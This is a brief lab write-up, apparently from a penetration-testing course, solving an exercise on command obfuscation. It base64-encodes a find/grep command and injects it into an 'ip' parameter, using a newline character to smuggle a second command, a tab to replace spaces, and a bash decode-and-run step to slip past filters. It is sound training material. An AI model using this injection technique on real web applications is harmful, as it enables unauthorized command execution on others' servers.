# [Advanced Command Obfuscation](Advanced%20Command%20Obfuscation.md)
### Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1

```shell
echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK
```

```
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK)
```
![](Screenshot%202026-07-18%20at%2013.03.42.png)
